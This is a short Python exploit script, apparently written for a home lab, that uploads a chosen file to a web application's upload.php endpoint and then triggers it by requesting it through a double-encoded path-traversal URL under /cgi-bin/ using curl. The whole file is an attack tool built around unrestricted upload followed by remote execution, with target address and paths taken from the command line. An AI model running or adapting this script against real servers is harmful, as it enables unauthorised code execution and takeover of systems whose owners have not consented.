import os
import sys
import requests


class uploader :

    def __init__(self, ExploitName, Address, UploadPath, UploadNameAttr, UploadLocation) -> None :

        self.ExploitName    = ExploitName
        self.Address        = Address
        self.UploadPath     = UploadPath
        self.UploadNameAttr = UploadNameAttr
        self.UploadLocation = UploadLocation

        self.files = {UploadNameAttr : open(self.ExploitName, 'rb')}


    def upload(self) -> None :

        # http://192.168.137.1/hacklab/websekolah/upload.php

        endpoint = f"http://{self.Address}{self.UploadPath}"

        requests.post(endpoint, files=self.files)


    def execute(self) :

        # curl "http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/{self.ExploitName}"

        endpoint = f'http://{self.Address}/cgi-bin/.%%32%65/htdocs{self.UploadLocation}/{self.ExploitName}'

        x=str(os.system(f'curl {endpoint}'))+" "


if __name__ == "__main__" :

    uploader = uploader(
        sys.argv[1],
        sys.argv[2],
        sys.argv[3],
        sys.argv[4],
        sys.argv[5]
    )

    uploader.upload()
    uploader.execute()